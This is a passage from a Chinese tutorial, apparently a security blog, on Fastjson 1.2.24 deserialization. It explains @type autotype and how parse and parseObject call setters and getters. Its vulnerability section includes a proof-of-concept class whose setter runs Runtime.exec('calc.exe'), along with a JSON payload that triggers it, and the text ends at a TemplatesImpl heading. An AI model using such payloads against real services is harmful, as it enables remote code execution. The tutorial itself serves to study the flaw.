FastJson 是一个由阿里巴巴研发的java库，可以把java对象转换为JSON格式，也可以把JSON字符串转换为对象
## 环境搭建
导入依赖
                com.alibaba
                fastjson
                1.2.24
## FastJson的简单使用
新建一个简单的pojo类
    package com.liang.pojo;
    public class User {
        private String name;
        private int id;
        public User(){
            System.out.println("无参构造");
        }
        public User(String name, int id) {
            System.out.println("有参构造");
            this.name = name;
            this.id = id;
        }
        @Override
        public String toString() {
            return "User{" +
                    "name='" + name + '\'' +
                    ", id=" + id +
                    '}';
        }
        public String getName() {
            System.out.print("getName");
            return name;
        }
        public void setName(String name) {
            System.out.println("setName");
            this.name = name;
        }
        public int getId() {
            System.out.println("getId");
            return id;
        }
        public void setId(int id) {
            System.out.println("setId");
            this.id = id;
        }
    }
关于Fastjson的使用，使用JSON的`toJSONString`方法 可以将对象转换为字符串
    public class FastjsonTest {
        public static void main(String[] args) {
            User user = new User("lihua",3);
            String json = JSON.toJSONString(user);
            System.out.println(json);
        }
    }
但是这里转化的字符串只有属性的值，无法区分是哪个类进行了序列化转化的字符串，这里就有了在`JSON.toJSONString`的第二个参数`SerializerFeature.WriteClassName`写下这个类的名字  
`@type`关键字标识的是这个字符串是由某个类序列化而来。
>
> 传入`SerializerFeature.WriteClassName`可以使得Fastjson支持自省，开启自省后序列化成JSON的数据就会多一个@type，这个是代表对象类型的JSON文本。
关于fastjson的反序列化
    package com.liang;
    import com.alibaba.fastjson.JSON;
    import com.alibaba.fastjson.JSONObject;
    import com.alibaba.fastjson.serializer.SerializerFeature;
    import com.liang.pojo.User;
    import java.lang.reflect.Type;
    public class FastjsonTest {
        public static void main(String[] args) {
            String json = "{\"@type\":\"com.liang.pojo.User\",\"id\":3,\"name\":\"lihua\"}";
            String json2 = "{\"id\":3,\"name\":\"lihua\"}";
            System.out.println(JSON.parseObject(json));
            System.out.println(JSON.parseObject(json,User.class));
            System.out.println(JSON.parseObject(json2, User.class));
            System.out.println(JSON.parseObject(json2));
            System.out.println(JSON.parse(json2));
            System.out.println(JSON.parse(json));
    //        User user = new User("lihua",3);
    //        String json = JSON.toJSONString(user,SerializerFeature.WriteClassName);
    //        System.out.println(json);
        }
    }
通过这个demo可以看出  
在使用`JSON.parseObject`方法的时候只有在第二个参数指定是哪个类
才会反序列化成功。在字符串中使用`@type:com.liang.pojo.User`指定类 会调用此类的get和set方法
但是会转化为`JSONObject`对象。  
而使用`JSON.parse`方法 无法在第二个参数中指定某个反序列化的类，它识别的是`@type`后指定的类  
而且可以看到 凡是反序列化成功的都调用了set方法
## 反序列化漏洞
@type 指定类  
使用`JSON.parse`方法反序列化会调用此类的set方法  
使用`JSON.parseObject`方法反序列化会调用此类get和set方法  
可以写一个恶意类，然后通过这一特性实现命令执行
    package com.liang.pojo;
    import java.io.IOException;
    public class User {
        private String name;
        private int id;
        public User(){
            System.out.println("无参构造");
        }
        public User(String name, int id) {
            System.out.println("有参构造");
            this.name = name;
            this.id = id;
        }
        @Override
        public String toString() {
            return "User{" +
                    "name='" + name + '\'' +
                    ", id=" + id +
                    '}';
        }
        public String getName() {
            System.out.print("getName");
            return name;
        }
        public void setName(String name) {
            System.out.println("setName");
            this.name = name;
        }
        public int getId()  {
            System.out.println("getId");
            return id;
        }
        public void setId(int id) throws IOException {
            System.out.println("setId");
            this.id = id;
            Runtime.getRuntime().exec("calc.exe");
        }
    }
    public class FastjsonTest {
        public static void main(String[] args) {
            String json = "{\"@type\":\"com.liang.pojo.User\",\"id\":3,\"name\":\"lihua\"}";
            System.out.println(JSON.parse(json));
### TemplatesImpl 链子